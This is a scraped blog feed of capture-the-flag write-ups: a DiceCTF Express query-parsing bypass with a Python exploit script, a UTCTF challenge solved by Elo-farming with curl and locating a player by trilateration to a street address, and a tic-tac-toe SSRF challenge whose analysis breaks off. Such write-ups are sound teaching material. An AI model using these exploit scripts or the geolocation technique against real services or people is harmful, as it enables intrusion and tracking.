document.querySelector(\u0026#39;#basic\u0026#39;) const advanced = document.querySelector(\u0026#39;#advanced\u0026#39;) const deliver = document.querySelector(\u0026#39;#deliver\u0026#39;) const showCookies = (number) =\u0026gt; { const span = document.querySelector(\u0026#39;span\u0026#39;) span.textContent = number } basic.addEventListener(\u0026#39;click\u0026#39;, async () =\u0026gt; { const res = await fetch(\u0026#39;/bake?number=1\u0026#39;, { method: \u0026#39;POST\u0026#39; }) const number = await res.text() showCookies(+number) }) advanced.addEventListener(\u0026#39;click\u0026#39;, async () =\u0026gt; { const res = await fetch(\u0026#39;/bake?number=12\u0026#39;, { method: \u0026#39;POST\u0026#39; }) const number = await res.text() showCookies(+number) }) deliver.addEventListener(\u0026#39;click\u0026#39;, async () =\u0026gt; { const res = await fetch(\u0026#39;/deliver\u0026#39;, { method: \u0026#39;POST\u0026#39; }) const text = await res.text() alert(text) }) `) }) app.post(\u0026#39;/bake\u0026#39;, (req, res) =\u0026gt; { const number = req.query.number if (!number) { res.end(\u0026#39;missing number\u0026#39;) } else if (number.length \u0026lt;= 2) { cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number)) res.end(cookies.get(req.user).toString()) } else { res.end(\u0026#39;that is too many cookies\u0026#39;) } }) app.post(\u0026#39;/deliver\u0026#39;, (req, res) =\u0026gt; { const current = cookies.get(req.user) ?? 0 const target = 1_000_000_000 if (current \u0026lt; target) { res.end(`not enough (need ${target - current}) more`) } else { res.end(process.env.FLAG) } }) app.listen(3000) The backend is a small Express.js app with no authentication or database ‚Äî just an in-memory Map to store cookie counts per user. Each visitor gets a user cookie set via middleware if it doesn‚Äôt already exist, and this ID is used as the key to track how many cookies they‚Äôve baked.\nThere are two main endpoints that matter here:\nPOST /bake: accepts a number parameter in the query string, increments the user‚Äôs cookie count accordingly ‚Äî but only if number.length \u0026lt;= 2. POST /deliver: checks if the user has reached one billion cookies. If so, it returns the flag; otherwise, it just tells you how many more you need. How do I know they matter? Well, because one serves the flag, and the other allows user input to be passed.\nLooking closer, The server doesn‚Äôt validate the type of number, only its length. That might seem restrictive, so let\u0026rsquo;s check express docs for more info.\nSomething in red, yay! Let‚Äôs take a closer look at how req.query.number is actually interpreted.\nTask Analysis Admittedly, I took the hardest route when solving the challenge on remote, and when I tried to solve it locally, it didn\u0026rsquo;t work xD.\nOnly after some time did I realize what was wrong: ExpressJS version 5.x mitigates the vulnerability (or feature?) I\u0026rsquo;m about to discuss. I found another (simpler and more effective) solution here\nTip: The solution above works because NaN compared to any numeric value returns false. Let\u0026rsquo;s now proceed with my solution, elegant and highlights my overthinking nature LOL.\nWe focus on this code block:\nif (number.length \u0026lt;= 2) { cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number)) res.end(cookies.get(req.user).toString()) } The check only limits the .length of number. Suspecting Express uses the qs module for query parsing (req.query), we can test that by creating our own ExpressJS environnment, parse a query string using both express and qs and compare the results.\nSet up the environnment: npm init -y npm install express@4.15.0 Set a simple web server to test the hypotheses: const express = require(\u0026#39;express\u0026#39;); const qs = require(\u0026#39;qs\u0026#39;); const app = express(); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const queryExpress = req.query; // the parsed req.query from expressjs const queryQS = qs.parse(\u0026#39;a[]=b\u0026#39;); // the parsed req.query from qs console.log(queryQS) console.log(queryExpress); res.end(); }); app.listen(3000, () =\u0026gt; { console.log(`Server listening at http://localhost:3000`); }); Test our hypotheses: curl \u0026#34;http://localhost:3000/?a[]=b\u0026#34; Gives:\nweb/cookie-recipes-v3/playground via Óúò v20.19.0 ‚ûú node index.js Server listening at http://localhost:3000 { a: [ \u0026#39;b\u0026#39; ] } { a: [ \u0026#39;b\u0026#39; ] } Great! express uses the qs module to parse query strings, not Node\u0026rsquo;s default querystring. Let\u0026rsquo;s check qs documentation to see what we can do with this.\nIt turns out that qs supports parsing of nested objects, arrays, and more. For example:\na[]=b gets parsed into:\n{ a: [\u0026#34;b\u0026#34;] } So how does this help in our challenge?\nIf we revisit the original code:\nif (number.length \u0026lt;= 2) { cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number)) res.end(cookies.get(req.user).toString()) } We can see that the check is on number.length \u0026lt;= 2. If number is a string like \u0026quot;100\u0026quot;, the check fails (length = 3). But if we send number[]= in the query string, Express (via qs) parses that into an array. Arrays in JavaScript have a .length property, and we can ensure that property is \u0026lt;= 2 by only providing one or two elements ‚Äî like number[]=1000000000.\nSo, even though the check is still in place, we bypass it by controlling the input type ‚Äî an array instead of a string. Now we just need to understand how JavaScript handles Number(array).\nYou could experiment with different inputs to find the answer quickly, but let‚Äôs take a deeper dive into JavaScript\u0026rsquo;s internal workings, specifically focusing on its implicit type conversion feature.\nYou can skip this section and move straight to the exploitation if you\u0026rsquo;re already familiar with the details of type conversion.\nWhen the Number() function is called, it converts its argument into a number following these steps:\nIf the argument is already a Number, it simply returns that number. If the argument is a String, it converts the string to a number (via StringToNumber()). If the argument is an object (which is the case for arrays in JavaScript), it calls the ToPrimitive() function. ToPrimitive() is invoked implicitly when we pass an object, and what does it do?\nAs the name suggests, this function converts an object to a primitive value (either a string or a number), and it does so by calling OrdinaryToPrimitive. This function takes the object and a preferred type (by default, number).\nOrdinaryToPrimitive proceeds as follows:\nIt first calls the object\u0026rsquo;s valueOf() method, which, in the case of arrays, returns the array itself. If that doesn\u0026rsquo;t provide a suitable primitive, it then calls the object\u0026rsquo;s toString() method, which returns the string representation of the array. .valueOf() returns the array itself because that\u0026rsquo;s how JavaScript\u0026rsquo;s Array.prototype.valueOf() is defined in the spec.\nYou can read more about Object.prototype.valueOf() and Object.prototype.toString() to understand how they work.\nSo, what‚Äôs happening here? When an array is passed to Number(), it is first converted to a string (via toString()), and then that string is passed to Number(), which converts it to a number using StringToNumber().\nThis process of implicit coercion explains how we can pass an array to Number() and still get the correct numeric result.\nExploitation Armed with this newfound knowledge, we know exactly what to do: we need to craft a payload that, when converted to a string, results in a number that won‚Äôt cause issues for the Number() function.\nThe payload will look like this:\nn u m b e r [ ] = 1 0 0 0 0 0 0 0 0 0 T h i s i s t h e e x a c t t a r g e t v a l u e w e n e e d Now, to submit this query string, we can create a simple Python script that will interact with the server and retrieve the flag:\nimport requests url = \u0026#34;https://cookie.dicec.tf\u0026#34; s = requests.Session() # Start a session to maintain cookies across requests s.get(url) # Send the payload to the /bake endpoint s.post(url + \u0026#34;/bake\u0026#34;, params={\u0026#34;number[]\u0026#34;: \u0026#34;100000000000000\u0026#34;}) # Send a request to the /deliver endpoint to fetch the flag res = s.post(url + \u0026#34;/deliver\u0026#34;) print(res.text) # Print the flag This script sends the payload to the server, which, after processing, returns the flag in the response.\n/tmp via üêç v3.13.2 took 2s ‚ûú python exploit.py dice{cookie_cookie_cookie} Flag is: dice{cookie_cookie_cookie}\nConclusions What we learned in this challenge:\nType Coercion in JavaScript: Understanding how JavaScript implicitly converts objects to primitives (e.g., arrays to strings) is crucial in exploiting type-based vulnerabilities.\nQuery String Parsing: Knowing how libraries like qs differ from default query parsing allows manipulation of input data to bypass security checks.\nArray Behavior: Recognizing how arrays handle .length and conversion to string helps in crafting inputs that pass validation checks.\nImplicit Conversion: Realizing the role of implicit functions like ToPrimitive() and OrdinaryToPrimitive() in type conversion clarifies the behavior of complex data types in JavaScript.\nReferences If you\u0026rsquo;re interested to learn more, here is a list of useful references:\nExpress.js API - req.body: Understanding how Express parses and handles request bodies is essential for analyzing how input is processed in the challenge.\nqs - Query String Parsing Library: This explains how the qs library parses query strings, which is key to understanding the behavior of the vulnerable application in the challenge.\nQuery String (Wikipedia): Provides general background on how query strings work, which helps in understanding the significance of query parameters in the exploit.\nJavaScript Equality Comparisons and Sameness (MDN): Details the behavior of equality operators, helping to understand how JavaScript compares values and objects in the challenge.\nTC39 - ToPrimitive: The official specification describing how JavaScript converts objects to primitive values, which is central to the implicit type conversion used in the exploit.\nTC39 - ToNumber: The specification for converting values to numbers, explaining how JavaScript handles conversion when objects (like arrays) are passed to the Number() function.\nqs - Parsing Arrays: Offers insights into how the qs library parses arrays in query strings, which is essential for understanding how the exploit works when using arrays.\nJavaScript Addition Operator (TC39): Describes how the addition operator works, particularly when involving coercion, which is part of the exploit when handling arrays and numbers.\nNumber Constructor (MDN): Explains how the Number() function behaves, specifically when dealing with arrays and how they are converted into numbers.\n","permalink":"https://hxuu.github.io/blog/ctf/dice25/cookie-recipes-v3/","summary":"Bypass ExpressJS length check using \u003ccode\u003enumber[]=value\u003c/code\u003e; \u003ccode\u003eqs\u003c/code\u003e parses array, coerced to pass validation.","title":"Dice25: Writeup for web/cookie-recipes-v3"},{"content":" Link for the challenge is here\n1. Challenge Overview After clicking on the link of the challenge, the website asks for permission to get our geographical location. Also, according to the text on the screen, it seems like we\u0026rsquo;re playing a game of numbers against opponents of the same Elo (or level), hence the \u0026ldquo;find match\u0026rdquo; button. Say we allow the web application our location. We see a welcome message containing what seems to be a random username and a starting elo of 1000. When we click on we see that we\u0026rsquo;re matched with another player of relatively the same elo, and interestingly, a relative distance from our current position in miles. We are also prompted to enter a number and submit it to view the result of our battle. Let\u0026rsquo;s do that: Our result is a loss :) In fact, no matter the number supplied to the game, we always lose the game lol, what a rigged game.\nSince the UI rendered doesn‚Äôt give away much of the web application‚Äôs logic, let‚Äôs dive into the page source to see how the latter works, namely, what endpoints are we interacting with, and what responses are we getting.\nMy approach in analyzing code is having a top to bottom approach. I start with page source, move to intercepting requests to analyze responses and so on.\nview-source (press ctrl+u) \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Number Champ\u0026lt;/title\u0026gt; \u0026lt;script\u0026gt; let userUUID=null,opponentUUID=null;var lat=0,lon=0;async function findMatch(){const e=await fetch(`/match?uuid=${userUUID}\u0026amp;lat=${lat}\u0026amp;lon=${lon}`,{method:\u0026#34;POST\u0026#34;}),t=await e.json();t.error?alert(t.error):(opponentUUID=t.uuid,document.getElementById(\u0026#34;match-info\u0026#34;).innerText=`Matched with ${t.user} (Elo: ${t.elo}, Distance: ${Math.round(t.distance)} miles)`,document.getElementById(\u0026#34;match-section\u0026#34;).style.display=\u0026#34;none\u0026#34;,document.getElementById(\u0026#34;battle-section\u0026#34;).style.display=\u0026#34;block\u0026#34;)}async function battle(){const e=document.getElementById(\u0026#34;number-input\u0026#34;).value;if(!e)return void alert(\u0026#34;Please enter a number.\u0026#34;);const t=await fetch(`/battle?uuid=${userUUID}\u0026amp;opponent=${opponentUUID}\u0026amp;number=${e}`,{method:\u0026#34;POST\u0026#34;}),n=await t.json();n.error?alert(n.error):(document.getElementById(\u0026#34;battle-result\u0026#34;).innerText=`Result: ${n.result}. Opponent\u0026#39;s number: ${n.opponent_number}. Your new Elo: ${n.elo}`,document.getElementById(\u0026#34;user-info\u0026#34;).innerText=`Your updated Elo: ${n.elo}`,document.getElementById(\u0026#34;battle-section\u0026#34;).style.display=\u0026#34;none\u0026#34;,document.getElementById(\u0026#34;match-section\u0026#34;).style.display=\u0026#34;block\u0026#34;)}window.onload=async()=\u0026gt;{if(navigator.geolocation)navigator.geolocation.getCurrentPosition((async e=\u0026gt;{lat=e.coords.latitude,lon=e.coords.longitude;const t=await fetch(`/register?lat=${lat}\u0026amp;lon=${lon}`,{method:\u0026#34;POST\u0026#34;}),n=await t.json();userUUID=n.uuid,document.getElementById(\u0026#34;user-info\u0026#34;).innerText=`Welcome, ${n.user}! Elo: ${n.elo}`}));else{alert(\u0026#34;Geolocation is not supported by this browser.\u0026#34;);const e=await fetch(`/register?lat=${lat}\u0026amp;lon=${lon}`,{method:\u0026#34;POST\u0026#34;}),t=await e.json();userUUID=t.uuid,document.getElementById(\u0026#34;user-info\u0026#34;).innerText=`Welcome, ${t.user}! Elo: ${t.elo}`}}; \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-light d-flex justify-content-center align-items-center vh-100 text-center\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;display-4 text-primary\u0026#34;\u0026gt;Number Champ\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;lead text-secondary\u0026#34;\u0026gt;Be the best. Show your opponent a higher number\u0026lt;/p\u0026gt; \u0026lt;p id=\u0026#34;user-info\u0026#34; class=\u0026#34;text-success\u0026#34;\u0026gt;Loading...\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;https://static.scientificamerican.com/sciam/cache/file/536BBA71-E627-4DB0-95D3A37002DB1CFD_source.jpg?w=600\u0026#34; class=\u0026#34;img-fluid\u0026#34; style=\u0026#34;max-width: 300px;\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;match-section\u0026#34; class=\u0026#34;container mt-4\u0026#34;\u0026gt; \u0026lt;p id=\u0026#34;battle-result\u0026#34; class=\u0026#34;text-info\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary\u0026#34; onclick=\u0026#34;findMatch()\u0026#34;\u0026gt;Find Match\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;battle-section\u0026#34; class=\u0026#34;container mt-4\u0026#34; style=\u0026#34;display: none;\u0026#34;\u0026gt; \u0026lt;p id=\u0026#34;match-info\u0026#34; class=\u0026#34;text-danger\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;h2 class=\u0026#34;text-danger\u0026#34;\u0026gt;Battle\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;input-group mb-3\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;number-input\u0026#34; type=\u0026#34;number\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Enter your number\u0026#34; /\u0026gt; \u0026lt;button class=\u0026#34;btn btn-success\u0026#34; onclick=\u0026#34;battle()\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; This is the underlying HTML of the web page we were at. As markup is not so interesting to us, our main focal point are the \u0026lt;script\u0026gt; tags, namely, the one at the top:\n\u0026lt;script\u0026gt; tag \u0026lt;script\u0026gt; let userUUID = null, opponentUUID = null; var lat = 0, lon = 0; async function findMatch() { const e = await fetch(`/match?uuid=${userUUID}\u0026amp;lat=${lat}\u0026amp;lon=${lon}`, { method: \u0026#34;POST\u0026#34; }), t = await e.json(); t.error ? alert(t.error) : (opponentUUID = t.uuid, document.getElementById(\u0026#34;match-info\u0026#34;).innerText = `Matched with ${t.user} (Elo: ${t.elo}, Distance: ${Math.round(t.distance)} miles)`, document.getElementById(\u0026#34;match-section\u0026#34;).style.display = \u0026#34;none\u0026#34;, document.getElementById(\u0026#34;battle-section\u0026#34;).style.display = \u0026#34;block\u0026#34;) } async function battle() { const e = document.getElementById(\u0026#34;number-input\u0026#34;).value; if (!e) return void alert(\u0026#34;Please enter a number.\u0026#34;); const t = await fetch(`/battle?uuid=${userUUID}\u0026amp;opponent=${opponentUUID}\u0026amp;number=${e}`, { method: \u0026#34;POST\u0026#34; }), n = await t.json(); n.error ? alert(n.error) : (document.getElementById(\u0026#34;battle-result\u0026#34;).innerText = `Result: ${n.result}. Opponent\u0026#39;s number: ${n.opponent_number}. Your new Elo: ${n.elo}`, document.getElementById(\u0026#34;user-info\u0026#34;).innerText = `Your updated Elo: ${n.elo}`, document.getElementById(\u0026#34;battle-section\u0026#34;).style.display = \u0026#34;none\u0026#34;, document.getElementById(\u0026#34;match-section\u0026#34;).style.display = \u0026#34;block\u0026#34;) } window.onload = async () =\u0026gt; { if (navigator.geolocation) navigator.geolocation.getCurrentPosition((async e =\u0026gt; { lat = e.coords.latitude, lon = e.coords.longitude; const t = await fetch(`/register?lat=${lat}\u0026amp;lon=${lon}`, { method: \u0026#34;POST\u0026#34; }), n = await t.json(); userUUID = n.uuid, document.getElementById(\u0026#34;user-info\u0026#34;).innerText = `Welcome, ${n.user}! Elo: ${n.elo}` })); else { alert(\u0026#34;Geolocation is not supported by this browser.\u0026#34;); const e = await fetch(`/register?lat=${lat}\u0026amp;lon=${lon}`, { method: \u0026#34;POST\u0026#34; }), t = await e.json(); userUUID = t.uuid, document.getElementById(\u0026#34;user-info\u0026#34;).innerText = `Welcome, ${t.user}! Elo: ${t.elo}` } }; \u0026lt;/script\u0026gt; As you can see, when the page loads (window.onload), we register ourselves at a given position on earth, by default, that\u0026rsquo;s our actual position in real life should we grant geolocation permission, otherwise (lat,lon)=(0,0).\nAfter that, we find a match player to play against. What\u0026rsquo;s interesting about this is the use of the (lat,lon) pair again as well as userUUID. Do we choose our location and what player we play with each match? Keep this in mind.\nFinally, we battle an opponent player, which we get his UUID from the previous step, and our elo (as well as their by extension) are updated based on the result of the battle which we know the game doesn\u0026rsquo;t allow us to win.\nImagine Earth\u0026rsquo;s surface as a grid: latitude lines wrap around it like belts, while longitude lines stretch from pole to pole. to learn more about the geographic coordinate system, check this\n2. Task Analysis The challenge overview was long I know, but now we know what we have to do. Since the challenge allows us to select any user to play the game with, and the goal is to figure out where \u0026lsquo;geopy\u0026rsquo; trains to be the best. We can play as many games as we need, switching from one player to another, until we level up to 3000elo.\nAfter that, we end up with a winner player, that when matched with others, including geopy, gets the latter relative distance to him. Our job then is to locate geopy.\n3. Solution Let\u0026rsquo;s achieve the first task: Level up to 3000elo.\nlevel-up.sh #!/usr/bin/env bash lat=0 lon=0 e=99 base=https://numberchamp-challenge.utctf.live # 1. Register our solo leveler - This player will reach 3000elo registerRes=$(curl -s -X POST \u0026#34;$base/register?lat=$lat\u0026amp;lon=$lon\u0026#34;) winnerUUID=$(echo $registerRes | awk -F, \u0026#39;{ print $3 }\u0026#39;| awk -F: \u0026#39;{ print $2 }\u0026#39; | awk -F\\\u0026#34; \u0026#39;{ print $2 }\u0026#39;) echo \u0026#34;winnerUUID: $winnerUUID\u0026#34; # 2. Match this player with other players of his level # (Note): # a\\ e doesn\u0026#39;t matter, it always results in the loss of the left player # b\\ the points earned depend on the elo you\u0026#39;re playing against (just like chess) for ((i = 0; i \u0026lt; 30; i++)); do matchRes=$(curl -s -X POST \u0026#34;$base/match?uuid=$winnerUUID\u0026amp;lat=$lat\u0026amp;lon=$lon\u0026#34;) matchResElo=$(echo $matchRes | awk -F, \u0026#39;{ print $2 }\u0026#39;) matchUUID=$(echo $matchRes | awk -F, \u0026#39;{ print $4 }\u0026#39;| awk -F: \u0026#39;{ print $2 }\u0026#39; | awk -F\\\u0026#34; \u0026#39;{ print $2 }\u0026#39;) echo \u0026#34;match result: $matchRes\u0026#34; echo echo \u0026#34;match elo: $matchResElo\u0026#34; echo \u0026#34;matchUUID: $matchUUID\u0026#34; echo echo \u0026#34;[+] Playing against players\u0026#34; curl -s -X POST \u0026#34;$base/battle?uuid=$matchUUID\u0026amp;opponent=$winnerUUID\u0026amp;number=$e\u0026#34; curl -s -X POST \u0026#34;$base/battle?uuid=$matchUUID\u0026amp;opponent=$winnerUUID\u0026amp;number=$e\u0026#34; curl -s -X POST \u0026#34;$base/battle?uuid=$matchUUID\u0026amp;opponent=$winnerUUID\u0026amp;number=$e\u0026#34; curl -s -X POST \u0026#34;$base/battle?uuid=$matchUUID\u0026amp;opponent=$winnerUUID\u0026amp;number=$e\u0026#34; curl -s -X POST \u0026#34;$base/battle?uuid=$matchUUID\u0026amp;opponent=$winnerUUID\u0026amp;number=$e\u0026#34; done matchRes=$(curl -s -X POST \u0026#34;$base/match?uuid=$winnerUUID\u0026amp;lat=$lat\u0026amp;lon=$lon\u0026#34;) echo \u0026#34;winnerUUID: $winnerUUID\u0026#34; echo \u0026#34;match result: $matchRes\u0026#34; Noice, we now have a player, a known geographical point against which the target has a known distance to. The problem is: Which direction is geopy located at? As we are right now, geopy could exist anywhere in the circle defined by winner location (ie lat,lon) and radius (distance) in miles.\nShould we just guess every possible position along the circle? The answer is No.\nIt turns out the problem in our hand is a famous problem whose solution is used by GPS locators.\nThe use of distances (or \u0026ldquo;ranges\u0026rdquo;) for determining the unknown position coordinates of a point of interest is called Trilateration.\nif you consider the Earth as a sphere, all points that are exactly X miles away from satellite 1 form a circle on the Earth\u0026rsquo;s surface (the blue one). This circle is called a spherical circle or circle of radius X miles on the sphere. It is not a great circle (which would be the largest possible circle on a sphere), but rather a small circle because its center is not the center of the Earth.\nThe target could be anywhere along the blue circle. To narrow our options, we introduce another known data point, that is exactly Y miles away from our target. The latter intersects with our first circle in exactly two points, one of which is our target location. To narrow the search even further, we introduce the third known data point which gives the exact location of the target.\nTo represent the problem mathematically, we first give the general equation of the sphere:\n(x - x_i)^2 + (y - y_i)^2 + (z - z_i)^2 = r^2 Where x,y,z sub i are the locations of the data points, and r is their respective distance from the geopy.\nThe intersection of the equations of each data point forms an equation system that when solved, gives the exact location of the target.\nSpherical distances require conversion to Cartesian for accurate calculations.\nWhen using earth\u0026rsquo;s radius, ensure its unit matches that of distances (miles).\nOk. Where do we get the 3 known points from? Do we play the game using a different player?\nNo, it turns out, we can locate our winner player wherever we want. We just have to match him against geopy from different points on earth and get the information, then use this implementation of Trilateration to get his exact position.\ntrilateration.py Note: The script needs a quite some tweaking to get it right, and tbh, I got better results when my inital points were close enough. If somebody got an aswer to this, feel free to reach out and teach me! Username @4nskarts on discord\nPerfect! We got our target latitude and longitude (39.9404306, -82.9967132). Flag is the address of this player (according to google maps), in the following format all lowercase:\nu t f l a g { \u0026lt; s t r e e t - a d d r e s s \u0026gt; - \u0026lt; c i t y \u0026gt; - \u0026lt; z i p - c o d e \u0026gt; } Navigating to google maps, and entering the coordinates, we get:\n1059 S High St, Columbus, OH 43206, United States\nstreet address: 1059 S High St city: Columbus zip code: 43206 Flag then is: utflag{1059-s-high-st-columbus-43206}\nLessons learned from this challenge:\nTrilateration Converting from longitude\\latitude to Cartesian coordinates Bash scripting NumPy This will be the place for the new image! note that the image path is the real path on the system you need its path in your blog. since my blog is running on /blog =\u0026gt; path should be /blog/images/\n","permalink":"https://hxuu.github.io/blog/ctf/utctf/number-champ/","summary":"\u003cp\u003e\u003cimg alt=\"challenge-description\" loading=\"lazy\" src=\"/blog/images/2025-03-18-11-21-52.png\"\u003e\nLink for the challenge is \u003ca href=\"https://numberchamp-challenge.utctf.live/\"\u003ehere\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"1-challenge-overview\"\u003e1. Challenge Overview\u003c/h2\u003e\n\u003cp\u003eAfter clicking on the link of the challenge, the website asks for permission to get our geographical\nlocation. Also, according to the text on the screen, it seems like we\u0026rsquo;re playing a game\nof numbers against opponents of the same Elo (or level), hence the \u003cem\u003e\u0026ldquo;find match\u0026rdquo;\u003c/em\u003e button.\n\u003cimg alt=\"challenge-website\" loading=\"lazy\" src=\"/blog/images/2025-03-18-11-25-24.png\"\u003e\u003c/p\u003e\n\u003cp\u003eSay we allow the web application our location. We see a welcome message containing what seems to be\na random username and a starting elo of 1000.\n\u003cimg alt=\"random username and starting elo\" loading=\"lazy\" src=\"/blog/images/2025-03-18-11-29-41.png\"\u003e\u003c/p\u003e","title":"UTCTF25 - Number Champ (WEB)"},{"content":" Challenge attachments and code here\n1. Challenge overview After starting the instance of the challenge, we\u0026rsquo;re faced with what looks like a tic tac toe game over a web front. As we can see below, we can deploy and ping the game server, then click on the squares to send an HTTP request to the game server containing our game state.\nSince the UI doesn\u0026rsquo;t give away much of the web application\u0026rsquo;s logic, let\u0026rsquo;s dive into the source code to see how the latter works, namely, what endpoints are there and which of those can we tamper with.\nMy approach in analyzing code is having a top to bottom approach. I start with the Dockerfile, move to application main logic, then utilities if they exist.\nDockerfile FROM python:3.9-alpine RUN apk add --no-cache docker-cli WORKDIR /app COPY requirements.txt . RUN pip install -r requirements.txt COPY ./templates ./templates COPY app.py . COPY url.py . COPY flag.txt /flag/ ENV DOCKER_HOST=\u0026#34;tcp://localhost:2375\u0026#34; ENV GAME_API_DOMAIN=\u0026#34;localhost\u0026#34; ENV GAME_API_PORT=\u0026#34;8000\u0026#34; CMD [\u0026#34;gunicorn\u0026#34;, \u0026#34;--bind\u0026#34;, \u0026#34;0.0.0.0:80\u0026#34;, \u0026#34;app:app\u0026#34;, \u0026#34;--capture-output\u0026#34;, \u0026#34;--log-level\u0026#34;, \u0026#34;debug\u0026#34;] As you can see, we start with a alpine linux image that has python installed. Move our application code inside the container, and the flag.txt file into /flag/ directory.\nWe set few environment variables and run the application. Funnily enough, during the CTF, I didn\u0026rsquo;t know what the DOCKER_HOST env variable meant, but as you\u0026rsquo;ll see, it\u0026rsquo;ll be our main attack vector.\napp.py from flask import Flask, render_template, request, jsonify import requests, json import url import subprocess import logging app = Flask(__name__) logging.basicConfig(level=logging.DEBUG) logger = logging.getLogger(__name__) def wrap_response(resp): try: parsed = json.loads(resp) except json.JSONDecodeError: parsed = resp return {\u0026#34;body\u0026#34;: parsed} @app.route(\u0026#34;/\u0026#34;) def home(): return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#34;/deploy\u0026#34;) def deploy(): container_inspect = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;inspect\u0026#34;, \u0026#34;game\u0026#34;], stdout=subprocess.PIPE) resp = json.loads(container_inspect.stdout) if len(resp) \u0026gt; 0: return jsonify({\u0026#34;status\u0026#34;: 1}) docker_cmd = [\u0026#34;docker\u0026#34;, \u0026#34;run\u0026#34;, \u0026#34;--rm\u0026#34;, \u0026#34;-d\u0026#34;, \u0026#34;-p\u0026#34;, \u0026#34;8000:8000\u0026#34;, \u0026#34;--name\u0026#34;, \u0026#34;game\u0026#34;, \u0026#34;b3gul4/tic-tac-toe\u0026#34;] subprocess.run(docker_cmd) return jsonify({\u0026#34;status\u0026#34;: 0}) @app.route(\u0026#34;/\u0026#34;) def game(): return render_template(\u0026#34;index.html\u0026#34;) @app.post(\u0026#34;/\u0026#34;) def play(): game = url.get_game_url(request.json) if game[\u0026#34;error\u0026#34;]: return jsonify({\u0026#34;body\u0026#34;: {\u0026#34;error\u0026#34;: game[\u0026#34;error\u0026#34;]}}) try: if game[\u0026#34;action\u0026#34;] == \u0026#34;post\u0026#34;: resp = requests.post(game[\u0026#34;url\u0026#34;], json=request.json) if resp.status_code \u0026lt; 200 or resp.status_code \u0026gt;= 300: logger.debug(resp.text) return jsonify({\u0026#34;body\u0026#34;: {\u0026#34;error\u0026#34;: \u0026#34;there was some error in game server\u0026#34;}}) else: resp = requests.get(game[\u0026#34;url\u0026#34;]) if resp.status_code \u0026lt; 200 or resp.status_code \u0026gt;= 300: logger.debug(resp.text) return jsonify({\u0026#34;body\u0026#34;: {\u0026#34;error\u0026#34;: \u0026#34;there was some error in game server\u0026#34;}}) except Exception as e: return jsonify({\u0026#34;body\u0026#34;: {\u0026#34;error\u0026#34;: \u0026#34;game server down\u0026#34;}}) return jsonify(wrap_response(resp.text)) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000, debug=True) This is a Flask application that has 2 endpoints: root (/) and /deploy.\n/deploy: The code here creates the game docker container. At first, it checks whether a docker container by the name game is existant or not. Then, it runs a container based off of b3gul4/tic-tac-toe image. It should be noted that docker-cli was installed in the Dockerfile, that\u0026rsquo;s why we can run commands inside the container.\nroot (/): This one is interesting. Unlike the deploy endpoint which we can\u0026rsquo;t control. It seems like the / endpoint accepts a POST request which ultimately (after url checking) visits a url that is supplied by us. Now we start to get an idea of how the application works. We can MAYBE make requests, but first we have to overcome the line of defense put by the application. Let\u0026rsquo;s check url.py\nurl.py import os URL = \u0026#34;http://\u0026lt;domain\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;game_action\u0026gt;\u0026#34; def is_valid_state(state): if len(state) != 9: return False for s in state: if s not in [\u0026#34;X\u0026#34;, \u0026#34;O\u0026#34;, \u0026#34;_\u0026#34;]: return False return True def get_game_url(req_json): try: api = req_json[\u0026#34;api\u0026#34;] keys = list(api.keys()) url = URL.replace(\u0026#34;\u0026lt;domain\u0026gt;\u0026#34;, os.getenv(\u0026#34;GAME_API_DOMAIN\u0026#34;)) url = url.replace(\u0026#34;\u0026lt;port\u0026gt;\u0026#34;, os.getenv(\u0026#34;GAME_API_PORT\u0026#34;)) # The game api is going to have many more endpoints in future, I do not want to hardcode the action url = url.replace(keys[0], api[keys[0]]) if not is_valid_state(req_json[\u0026#34;state\u0026#34;]): return {\u0026#34;url\u0026#34;: None, \u0026#34;action\u0026#34;: None, \u0026#34;error\u0026#34;: \u0026#34;Invalid state\u0026#34;} return {\u0026#34;url\u0026#34;: url, \u0026#34;action\u0026#34;: req_json[\u0026#34;action\u0026#34;], \u0026#34;error\u0026#34;: None} except Exception as e: print(e) return {\u0026#34;url\u0026#34;: None, \u0026#34;action\u0026#34;: None, \u0026#34;error\u0026#34;: \u0026#34;Internal server error\u0026#34;} The function get_game_url (the one in app.py) attempts to sanitize our user input. It does so as follows:\ntakes input like this: { \u0026#39;api\u0026#39;: X, \u0026#39;state\u0026#39;: Y, \u0026#39;action\u0026#39;: Z } extracts a list of keys from the api. This suggests that X is actually an object of key-value pairs. like this: { \u0026#34;api\u0026#34;: { \u0026#34;key1\u0026#34;: 